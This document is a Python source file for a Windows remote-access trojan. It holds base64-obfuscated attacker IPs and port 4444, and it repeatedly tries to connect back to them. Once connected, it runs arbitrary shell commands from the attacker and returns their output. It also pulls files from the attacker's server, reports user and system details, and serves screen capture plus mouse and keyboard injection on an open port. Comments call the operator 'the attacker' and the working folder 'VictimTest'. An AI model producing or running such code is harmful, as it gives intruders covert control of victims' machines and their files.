import os
import socket
import subprocess
import time
import base64
import signal
import sys
import ctypes
import win32api
import win32con
import win32process
import win32gui
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import shutil
import cv2
import numpy as np
import pyautogui
import struct
import platform
import sqlite3
import random
import io
from connection_manager import ConnectionManager

pyautogui.FAILSAFE = False

# Server configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 5555       # Port to listen on
MAX_CONNECTIONS = 5  # Maximum number of simultaneous connections

# Set up screen resolution
screen_width, screen_height = pyautogui.size()
print(f"Screen resolution: {screen_width}x{screen_height}")

# Lock for thread synchronization
print_lock = threading.Lock()

def capture_screen():
    """Capture the screen and return compressed image bytes"""
    # Take a screenshot
    screenshot = pyautogui.screenshot()
    
    # Convert to bytes
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='JPEG', quality=50)
    return img_byte_arr.getvalue()

def handle_client(conn, addr, connection_manager):
    """Handle individual client connection"""
    print(f"[NEW CONNECTION] {addr} connected.")
    
    # Register connection with the connection manager
    client_id = connection_manager.register_connection(conn, addr)
    
    try:
        while True:
            # Receive command from client
            command = conn.recv(1024).decode('utf-8')
            
            if not command:
                break
                
            # Update activity timestamp
            connection_manager.update_activity(client_id)
                
            if command.startswith('SCREEN'):
                # Send screen capture to client
                img_bytes = capture_screen()
                # Send the size of the image first
                conn.sendall(struct.pack('>L', len(img_bytes)))
                # Then send the image
                conn.sendall(img_bytes)
                
            elif command.startswith('MOUSE'):
                # Format: MOUSE|x|y|action
                # Actions: click, right_click, double_click, move
                parts = command.split('|')
                if len(parts) >= 4:
                    x = int(parts[1])
                    y = int(parts[2])
                    action = parts[3]
                    
                    if action == 'click':
                        pyautogui.click(x, y)
                    elif action == 'right_click':
                        pyautogui.rightClick(x, y)
                    elif action == 'double_click':
                        pyautogui.doubleClick(x, y)
                        
            elif command.startswith('KEY'):
                # Format: KEY|text or KEY|special_key
                parts = command.split('|')
                if len(parts) >= 2:
                    key_input = parts[1]
                    
                    # Check if it's a special key
                    if key_input.startswith('special:'):
                        special_key = key_input.replace('special:', '')
                        pyautogui.press(special_key)
                    else:
                        pyautogui.write(key_input)
                
    except Exception as e:
        print(f"[ERROR] {addr}: {e}")
    finally:
        # Unregister connection from the connection manager
        connection_manager.unregister_connection(client_id)
        conn.close()
        print(f"[DISCONNECTED] {addr} disconnected.")

# Set up the server
def start_server():
    # Get the path to the Documents folder
    documents_path = os.path.expanduser('~\\Documents')

    # Create a new folder inside Documents
    folder_name = "VictimTest"
    new_folder_path = os.path.join(documents_path, folder_name)

    # Create the folder if it doesn't exist
    if not os.path.exists(new_folder_path):
        os.makedirs(new_folder_path)

    # Change the working directory to the new folder
    os.chdir(new_folder_path)
    server_address = ('', 8081)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server started on port 8081...")
    httpd.serve_forever()

CHUNK_SIZE = 1024 * 1

def start_combined_server():
    """Start combined server handling both file serving and remote commands"""
    servers = []
    connection_manager = ConnectionManager(HOST, PORT)
    connection_manager.start()
    
    try:
        # Create and bind command server
        cmd_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cmd_server.bind((HOST, PORT))
        cmd_server.listen(MAX_CONNECTIONS)
        
        # Create custom request handler class
        class CustomRequestHandler(SimpleHTTPRequestHandler):
            def translate_path(self, path):
                """Translate URL path to filesystem path, checking Documents/VictimTest first"""
                # First try the default path resolution
                path = SimpleHTTPRequestHandler.translate_path(self, path)
                
                # If not found, try in Documents/VictimTest folder
                if not os.path.exists(path):
                    docs_path = os.path.expanduser('~\\Documents\\VictimTest')
                    alt_path = os.path.join(docs_path, os.path.basename(path))
                    if os.path.exists(alt_path):
                        return alt_path
                return path
            
            def do_GET(self):
                """Handle GET requests (file downloads and directory listings)"""
                try:
                    path = self.translate_path(self.path)
                    if not os.path.exists(path):
                        self.send_error(404, "File not found")
                        return
                        
                    if os.path.isdir(path):
                        # Generate directory listing
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html; charset=utf-8')
                        self.end_headers()
                        
                        # Build directory listing HTML
                        listing = f"<html><head><title>Directory listing for {self.path}</title></head>"
                        listing += "<body><h2>Directory listing</h2><hr><ul>"
                        
                        # Add parent directory link
                        if self.path != '/':
                            listing += f'<li><a href="{os.path.dirname(self.path)}">..</a></li>'
                            
                        # Add files and subdirectories
                        for name in sorted(os.listdir(path)):
                            full_path = os.path.join(path, name)
                            display_name = name
                            if os.path.isdir(full_path):
                                display_name += "/"
                            listing += f'<li><a href="{os.path.join(self.path, name)}">{display_name}</a></li>'
                            
                        listing += "</ul><hr></body></html>"
                        self.wfile.write(listing.encode('utf-8'))
                    else:
                        # Serve the file with streaming
                        with open(path, 'rb') as f:
                            self.send_response(200)
                            self.send_header('Content-type', 'application/octet-stream')
                            self.send_header('Content-Length', str(os.path.getsize(path)))
                            self.end_headers()
                            shutil.copyfileobj(f, self.wfile)
                except Exception as e:
                    self.send_error(500, f"Server error: {str(e)}")

        # Create and bind HTTP file server with our custom handler
        httpd = HTTPServer(('', HTTP_PORT), CustomRequestHandler)
        
        servers.append((cmd_server, "Command Server"))
        servers.append((httpd, "HTTP File Server"))
        
        # Start servers in separate threads
        for server, name in servers:
            def server_worker(s):
                if isinstance(s, HTTPServer):
                    s.serve_forever()
                else:  # Socket server
                    while True:
                        try:
                            cmd_server.settimeout(1)
                            conn, addr = s.accept()
                            client_thread = threading.Thread(
                                target=handle_client,
                                args=(conn, addr, connection_manager)
                            )
                            client_thread.daemon = True
                            client_thread.start()
                        except socket.timeout:
                            continue
                            
            server_thread = threading.Thread(
                target=server_worker,
                args=(server,),
                daemon=True
            )
            server_thread.start()
        
        print(f"[LISTENING] Combined server started on ports {PORT} (commands) and {HTTP_PORT} (files)")
        print(f"[MANAGEMENT] Connection manager listening on {HOST}:{PORT+1}")
        
        while True:
            # Accept connections with timeout to allow for keyboard interrupt
            cmd_server.settimeout(1)
            try:
                conn, addr = cmd_server.accept()
                
                if connection_manager.get_connection_count() >= MAX_CONNECTIONS:
                    print(f"[REJECTED] {addr} - Maximum connections reached")
                    conn.sendall(b'ERROR: Maximum connections reached')
                    conn.close()
                    continue
                
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(conn, addr, connection_manager)
                )
                client_thread.daemon = True
                client_thread.start()
                
                print(f"[ACTIVE CONNECTIONS] {connection_manager.get_connection_count()}")
                
            except socket.timeout:
                continue
                
    except KeyboardInterrupt:
        print("[SHUTTING DOWN] Server is shutting down...")
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        connection_manager.stop()
        for server, _ in servers:
            try:
                if isinstance(server, socket.socket):
                    server.close()
                else:
                    server.server_close()
            except:
                pass
        print("[CLOSED] Servers closed.")

# Get the path to the Documents folder
documents_path = os.path.expanduser('~\\Documents')

# Create a new folder inside Documents
folder_name = "VictimTest"
new_folder_path = os.path.join(documents_path, folder_name)

# Create the folder if it doesn't exist
if not os.path.exists(new_folder_path):
    os.makedirs(new_folder_path)

# Change the working directory to the new folder
os.chdir(new_folder_path)

# Verify the current working directory
print("Current working directory:", os.getcwd())

# Define HTTP port constant
HTTP_PORT = 8080

# Obfuscated target IP addresses and port
encoded_target_1 = "bG9jYWxob3N0"  # Base64 encoded "localhost"
encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71"
encoded_target_3 = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
encoded_port = "NDQ0NA=="        # Base64 encoded "4444"

# Decode the port
target_port = int(base64.b64decode(encoded_port).decode())

# User profile directory
user_profile = os.getenv('USERPROFILE')

# Track the current working directory
current_directory = os.getcwd()

# Create a database connection with timeout and proper locking
def get_db_connection():
    db_path = os.path.join(new_folder_path, "connection_history.db")
    conn = sqlite3.connect(db_path, timeout=3.0, isolation_level=None)
    conn.execute("PRAGMA journal_mode=WAL")  # Use Write-Ahead Logging for better concurrency
    conn.execute("PRAGMA busy_timeout=10000")  # Set busy timeout to 10 seconds
    return conn

# Initialize database
def init_database():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Create connection history table
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS connection_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            target_ip TEXT,
            success INTEGER,
            error_message TEXT
        )
        ''')
        
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"Database initialization error: {e}")

# Log connection attempt
def log_connection_attempt(target_ip, success, error_message=""):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute(
            "INSERT INTO connection_history (timestamp, target_ip, success, error_message) VALUES (?, ?, ?, ?)",
            (timestamp, target_ip, 1 if success else 0, error_message)
        )
        
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"Database logging error: {e}")

# Initialize database
init_database()

def find_window_by_pid(pid):
    """Find a window by its process ID."""
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    if hwnds:
        return hwnds[0]
    else:
        raise Exception(f"No window found for PID {pid}.")
    
def send_keystrokes(hwnd, text):
    """Send keystrokes to a window."""
    for char in text:
        win32api.SendMessage(hwnd, win32con.WM_CHAR, ord(char), 0)
    win32api.PostMessage(hwnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

# Define a handler function for console events.
def console_handler(ctrl_type):
    # CTRL_CLOSE_EVENT has the value 2.
    if ctrl_type == 2:
        try:
            # Execute the taskkill command to kill all processes named "java.exe".
            subprocess.run("taskkill /F /IM java2.exe", shell=True, check=True)

            print("All Java processes have been terminated.")
        except subprocess.CalledProcessError as e:
            print("Failed to kill Java processes:", e)
        # Return True to indicate the event has been handled.
        return True
    # For other control events, return False.
    return False

# Create a Windows function type for the console control handler.
HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
handler = HandlerRoutine(console_handler)

# Register the handler with the Windows API.
if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
    print("Error: Could not set control handler")

#clear console
#subprocess.run("cls", shell=True)

def connect_to_attacker():
    # Track which IP to try (0=first, 1=second, 2=third)
    ip_index = 0
    
    while True:
        try:
            time.sleep(1)
            
            # Rotate through the three IP addresses
            if ip_index == 0:
                target_ip = base64.b64decode(encoded_target_1).decode()
                print(f"Attempting to connect to first target...")
            elif ip_index == 1:
                target_ip = base64.b64decode(encoded_target_2).decode()
                print(f"Attempting to connect to second target...")
            else:
                target_ip = base64.b64decode(encoded_target_3).decode()
                print(f"Attempting to connect to third target...")
            
            # Increment index for next attempt (cycle through 0, 1, 2)
            ip_index = (ip_index + 1) % 3
            
            # Create a socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)  # Set a timeout for the connection attempt
            s.connect((target_ip, target_port))
            
            # Log successful connection
            log_connection_attempt(target_ip, True)
            
            # If connection is successful, return the socket
            print(f"Connected to {target_ip}:{target_port}")
            return s
            
        except ConnectionRefusedError:
            # If connection is refused, retry after a delay
            log_connection_attempt(target_ip, False, "Connection refused")
            print(f"Connection refused, retrying...")
            time.sleep(1)
        except socket.timeout:
            # If the connection times out, retry after a delay
            log_connection_attempt(target_ip, False, "Connection timed out")
            print(f"Connection timed out, retrying...")
            time.sleep(1)
        except Exception as e:
            # Handle other exceptions
            log_connection_attempt(target_ip, False, str(e))
            print(f"Connection error: {str(e)}, retrying...")
            time.sleep(1)

def handle_connection(s):
    global current_directory
    try:
        # Start a shell and communicate through the socket
        while True:
            try:
                # Receive a command from the attacker
                command = s.recv(1024).decode().strip()
                if not command:
                    break  # Exit if the connection is closed

                # Handle special commands
                if command.startswith("cd "):
                    try:
                        # Change the directory
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        output = f"Changed directory to: {current_directory}\n"
                    except Exception as e:
                        output = f"{str(e)}\n"  # Send the error message if the directory change fails

                elif command == ("sigma2"):
                    try:
                        subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False)
                        # Kill the current process
                        os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
                    except Exception as e:
                        output = f"{str(e)}\n"
                elif command == ("downloads2"):
                    try:
                        user_profile = os.getenv('USERPROFILE')
                        print("User Profile Path:", user_profile)
                        
                        # Create a new directory called "Downloads2" in the user profile directory
                        new_directory = os.path.join(user_profile, "Downloads2")
                        
                        # Check if the directory already exists
                        if not os.path.exists(new_directory):
                            os.mkdir(new_directory)
                            print(f"Directory 'Downloads2' created in {user_profile}")
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            output = f"Directory 'Downloads2' created and changed to: {current_directory}\n"
                        else:
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            output = f"Changed directory to: {current_directory}\n"
                    except Exception as e:
                        output = f"{str(e)}\n"
                        
                elif command.startswith("download "):
                    def download_file(url, temp_path):
                        """Download file from URL with streaming"""
                        try:
                            with requests.get(url, stream=True, timeout=5) as r:
                                r.raise_for_status()
                                with open(temp_path, 'wb') as f:
                                    if os.name == 'posix':
                                        import fcntl
                                        fcntl.flock(f, fcntl.LOCK_EX)
                                    elif os.name == 'nt':
                                        import msvcrt
                                        msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
                                    for chunk in r.iter_content(chunk_size=8192):
                                        if chunk:
                                            f.write(chunk)
                                    f.flush()
                                    os.fsync(f.fileno())
                            return True
                        except Exception as e:
                            return f"Download failed: {str(e)}"

                    def rename_temp_file(temp_path, file_name):
                        """Handle atomic file rename with locking"""
                        try:
                            with FileLock(file_name):
                                if os.path.exists(file_name):
                                    os.remove(file_name)
                                os.rename(temp_path, file_name)
                            return True
                        except Exception as e:
                            return f"File rename failed: {str(e)}"

                    def cleanup_temp_file(temp_path):
                        """Safely remove temporary file"""
                        try:
                            if os.path.exists(temp_path):
                                os.remove(temp_path)
                            return True
                        except Exception as e:
                            return f"Cleanup failed: {str(e)}"

                    # Main download handling
                    file_name = command[9:].strip()
                    temp_path = f"{file_name}.{os.getpid()}.tmp"
                    output = ""
                    
                    try:
                        current_ip = s.getpeername()[0]
                        url = f'http://{current_ip}:{HTTP_PORT}/{file_name}'
                        
                        # Step 1: Download file
                        download_result = download_file(url, temp_path)
                        if download_result is not True:
                            output = download_result + "\n"
                            raise Exception(download_result)
                            
                        # Step 2: Rename temp file
                        rename_result = rename_temp_file(temp_path, file_name)
                        if rename_result is not True:
                            output = rename_result + "\n"
                            raise Exception(rename_result)
                            
                        output = f"File downloaded: {file_name}\n"
                        
                    except Exception as e:
                        try:
                            error_msg = str(e)
                            cleanup_result = cleanup_temp_file(temp_path)
                            if cleanup_result is not True:
                                error_msg += f" ({cleanup_result})"
                            output = f"Error: {error_msg}\n"
                        except Exception as final_error:
                            output = f"Critical error during cleanup: {str(final_error)}\n"
                        except Exception as e:
                            # Clean up temp file if download failed
                            if os.path.exists(temp_path):
                                try:
                                    os.remove(temp_path)
                                except:
                                    pass
                            output = f"Error downloading file: {str(e)}\n"

                elif command == ("connection_history"):
                    try:
                        conn = get_db_connection()
                        cursor = conn.cursor()
                        cursor.execute("SELECT * FROM connection_history ORDER BY timestamp DESC LIMIT 20")
                        rows = cursor.fetchall()
                        conn.close()
                        
                        if rows:
                            output = "Connection History (Last 20 attempts):\n"
                            output += "ID | Timestamp | Target IP | Success | Error\n"
                            for row in rows:
                                output += f"{row[0]} | {row[1]} | {row[2]} | {'Success' if row[3] else 'Failed'} | {row[4]}\n"
                        else:
                            output = "No connection history found.\n"
                    except Exception as e:
                        output = f"Error retrieving connection history: {str(e)}\n"

                elif command.startswith("upload "):
                    try:
                        file_path = command[len("upload "):].strip()

                        if os.path.exists(file_path):
                            current_working_dir = os.getcwd()
                            file_name = os.path.basename(file_path)
                            destination_path = os.path.join(current_working_dir, file_name)
                            
                            # Use file lock during upload
                            with FileLock(destination_path) as lock:
                                # Check if file exists again after acquiring lock
                                if os.path.exists(destination_path):
                                    # Append unique suffix if file exists
                                    base, ext = os.path.splitext(file_name)
                                    destination_path = os.path.join(
                                        current_working_dir,
                                        f"{base}_{int(time.time())}{ext}"
                                    )
                                
                                shutil.copy2(file_path, destination_path)
                            
                            output = f"File uploaded: {file_path} -> {destination_path}\n"
                        else:
                            output = f"File not found: {file_path}\n"
                    except Exception as e:
                        output = f"Error uploading file: {str(e)}\n"

                elif command == "whoami" or command == "Whoami":
                    try:
                        result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
                        username = result.stdout.strip()
                        # Extract everything after the backslash in the username
                        if "\\" in username:
                            username = username.split("\\")[-1]
                        
                        # Get system information
                        system_info = "System Info:\n"
                        system_info += f"OS: {platform.system()} {platform.version()}\n"
                        system_info += f"Architecture: {platform.architecture()[0]}\n"
                        system_info += f"Machine: {platform.machine()}\n"
                        system_info += f"Processor: {platform.processor()}\n"
                        
                        # Get current working directory
                        cwd = os.getcwd()
                        
                        # Combine all information
                        output = f"Username: {username}\n{system_info}Current Directory: {cwd}\n"
                    except Exception as e:
                        output = f"Error getting system info: {str(e)}\n"

                elif command == "exit":
                    # Close the connection and exit
                    s.close()
                    break

                else:
                    # Execute the command and get the output
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        if not output:
                            output = "Command executed successfully (no output)\n"
                    except Exception as e:
                        output = f"{str(e)}\n"

                # Send the output back to the attacker
                s.send(output.encode())

            except Exception as e:
                # Handle any exceptions that occur during command execution
                try:
                    continue
                except:
                    # If we can't send the error, the connection is probably closed
                    break
                
    except Exception as e:
        print(f"Connection error: {str(e)}")
    finally:
        try:
            s.close()
        except:
            pass

class FileLock:
    """Simple file lock implementation for cross-platform use"""
    def __init__(self, filename):
        self.filename = filename
        self.lockfile = f"{filename}.lock"
        self.fd = None
        
    def __enter__(self):
        if os.name == 'posix':
            import fcntl
            self.fd = open(self.lockfile, 'w')
            fcntl.flock(self.fd, fcntl.LOCK_EX)
        elif os.name == 'nt':
            import msvcrt
            self.fd = open(self.lockfile, 'w')
            msvcrt.locking(self.fd.fileno(), msvcrt.LK_NBLCK, 1)
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.fd:
            if os.name == 'posix':
                import fcntl
                fcntl.flock(self.fd, fcntl.LOCK_UN)
            elif os.name == 'nt':
                import msvcrt
                msvcrt.locking(self.fd.fileno(), msvcrt.LK_UNLCK, 1)
            self.fd.close()
            try:
                os.remove(self.lockfile)
            except:
                pass

# Main loop
while True:
    try:
        # Start HTTP server for file uploads in a separate thread
        threading.Thread(target=start_server, daemon=True).start()
        threading.Thread(target=start_combined_server, daemon=True).start()

        # Connect to the attacker
        s = connect_to_attacker()
        
        # Handle the connection
        handle_connection(s)
        
    except Exception as e:
        time.sleep(5)  # Wait before retrying